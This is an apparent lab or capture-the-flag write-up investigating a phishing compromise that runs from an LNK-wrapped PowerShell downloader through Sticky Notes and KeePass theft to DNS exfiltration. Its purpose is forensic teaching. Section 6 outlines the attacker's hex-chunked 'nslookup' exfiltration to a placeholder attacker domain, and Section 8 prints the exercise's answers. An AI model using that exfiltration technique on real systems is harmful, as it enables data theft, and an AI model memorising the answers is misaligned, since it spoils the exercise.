Boogeyman 1: From Phishing Email to DNS Exfiltration

A detailed walkthrough of the full investigation: phishing email, encrypted ZIP, LNK execution, PowerShell C2, host enumeration, Sticky Notes discovery, KeePass theft and DNS exfiltration.

Goal: reconstruct how Julianne Westcott was compromised, identify the payload chain, determine what sensitive data was accessed, and prove the exfiltration method using both endpoint and network evidence.

Scenario Overview

The incident started with a business-looking collection email sent to a finance employee. The attacker used an encrypted ZIP and a Windows shortcut to hide an encoded PowerShell command. After execution, the attacker used HTTP for C2, searched the victim host, found credentials in Sticky Notes, stole a KeePass database and exfiltrated it over DNS.

Email → Encrypted ZIP → LNK → Encoded PowerShell → Remote script → HTTP C2 → Seatbelt → Sticky Notes → KeePass DB → DNS exfiltration → File reconstruction

How I Approached the Case

  1. Start from the email. Identify sender, recipient, attachment, password and delivery path.
  2. Inspect the payload safely. Extract the ZIP and parse the LNK instead of executing it.
  3. Decode before judging. Encoded PowerShell needs to be decoded so the actual behavior is visible.
  4. Use endpoint logs to understand impact. PowerShell logs reveal the commands, tools and files used by the attacker.
  5. Use PCAP to prove network behavior. Wireshark confirms file hosting, C2 method and exfiltration protocol.
  6. Reconstruct the stolen data. DNS chunks must be extracted, decoded and rebuilt before opening the stolen file.

1. Email Triage: Initial Access

I first opened the email artifact in a mail viewer. I was looking for the human side of the attack: who sent it, who received it, what business story it used and which file the victim was pushed to open.

From: Arthur Griffin <agriffin@bpakcaging.xyz>
To: Julianne Westcott <julianne.westcott@hotmail.com>
Subject: Collection for Quick Logistics LLC - Jan 2023
Attachment: Invoice.zip

The encrypted ZIP was the first red flag. The password was included in the email body, which is a common way to reduce automated inspection of attachments.

The header evidence showed Elastic Email infrastructure, helping explain the delivery path. I treated this as context, not the final proof of compromise.

2. LNK Payload: The Invoice Was an Execution Wrapper

After extracting the archive, I did not get a normal invoice document. I got a Windows shortcut.

unzip Invoice.zip
file Invoice_20230103.lnk
lnkparse Invoice_20230103.lnk

A shortcut is dangerous here because it can look like an invoice but actually run a command. The parsed shortcut revealed encoded PowerShell. That changed my next step: decode the command and read what it really does.

The decoded PowerShell showed a remote download-and-execute pattern. From this point onward, I knew the endpoint logs should contain PowerShell activity and the PCAP should contain traffic to attacker-controlled infrastructure.

3. PowerShell Logs: Following the Real Commands

I moved to the PowerShell JSON logs and used jq plus targeted grep searches to avoid reading the whole file manually.

cat powershell.json | jq '.'
cat powershell.json | jq -r '.. | strings?' | grep -iE "bpakcaging|Invoke|WebRequest|Download|nslookup|Seatbelt|sq3|kdbx"
files.bpakcaging.xyz       → file / payload hosting
cdn.bpakcaging.xyz:8080   → HTTP C2 endpoint

This gave me two directions: check payload hosting in HTTP traffic, and keep reading PowerShell logs for post-compromise activity.

4. Enumeration: Seatbelt Execution

I saw sb.exe in the logs. The context matched Seatbelt-style enumeration.

grep -iE "sb.exe|seatbelt" powershell_strings.txt

This showed the attacker was not only running a downloader. They were actively enumerating the host to understand the environment and find valuable data.

5. Sticky Notes: Finding Where the Password Came From

Later, I saw sq3.exe being used against the Microsoft Sticky Notes database. This was important because users sometimes store passwords or sensitive notes there.

C:\Users\j.westcott\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite

This explained where the KeePass master password could be recovered later. The decoded Sticky Notes content is shown near the reconstruction phase.

6. KeePass Targeting and DNS Exfiltration Preparation

The next important file was protected_data.kdbx. The commands showed the attacker reading the file as bytes, converting it to hex, splitting the hex into chunks and using DNS queries for exfiltration.

Get-Content protected_data.kdbx -Encoding Byte
Convert bytes to hex
Split hex into chunks
nslookup <hex_chunk>.<attacker_domain>

7. PCAP Confirmation: HTTP C2 and DNS Exfiltration

The endpoint evidence was already strong, but I still needed to prove the network side. I opened the capture in Wireshark and focused on HTTP and DNS.

wireshark capture.pcapng

Useful filters:
http
dns
http.request.method == POST
tcp.stream eq X
Server: SimpleHTTP/0.6 Python/3.10.7

This answered the payload hosting software: Python SimpleHTTP server.

The C2 output used HTTP POST. This made sense because the infected host needed to return command output to the attacker.

The DNS traffic contained long encoded-looking labels, matching the PowerShell evidence that chunked the KeePass file into DNS queries.

8. Reconstructing and Verifying the Stolen Data

After confirming DNS exfiltration, the remaining task was to turn the chunks back into the stolen file. The high-level process was to extract the encoded DNS labels, order them, join the hex data, convert it back to bytes and verify the result as a KeePass database.

%p9^3!lL^Mz47E2GaT^y

After opening the reconstructed database with the Sticky Notes password, the stored credit card number was:

4024007128269551

What I Learned

  • Encrypted archives in phishing emails are suspicious when the password is included in the message body.
  • LNK files can hide encoded commands while pretending to be business documents.
  • Endpoint logs explain what the attacker did; PCAP confirms where the traffic went.
  • DNS exfiltration often appears as long encoded subdomain labels.
  • A good writeup should show the evidence path, not only the final answers.
